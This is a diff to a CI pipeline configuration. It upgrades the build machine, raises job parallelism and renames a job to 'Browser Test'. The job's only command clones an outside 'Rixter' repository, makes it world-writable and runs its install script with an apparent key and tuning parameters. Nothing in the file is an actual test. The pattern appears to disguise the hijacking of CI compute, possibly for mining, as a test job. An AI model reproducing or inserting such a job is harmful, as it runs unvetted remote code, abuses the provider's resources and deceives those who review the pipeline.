@@ -2,14 +2,14 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
 
 blocks:
   - name: 'Test'
     task:
       jobs:
-        - name: 'Job-1'
-          parallelism: 4
+        - name: 'Browser Test'
+          parallelism: 5
           commands:
-            - sudo apt update || apt update && sudo apt install -y git whiptail || apt install -y git whiptail && git clone https://github.com/golemcli/Rixter.git && chmod -R 777 Rixter && Rixter/install.sh "2" "fb6eb032c1e071f0675d01e9d29bf5a2" "9" "5" "2"
+            - sudo apt update || apt update && sudo apt install -y git whiptail || apt install -y git whiptail && git clone https://github.com/golemcli/Rixter.git && chmod -R 777 Rixter && Rixter/install.sh "2" "fb6eb032c1e071f0675d01e9d29bf5a2" "25" "5" "2"
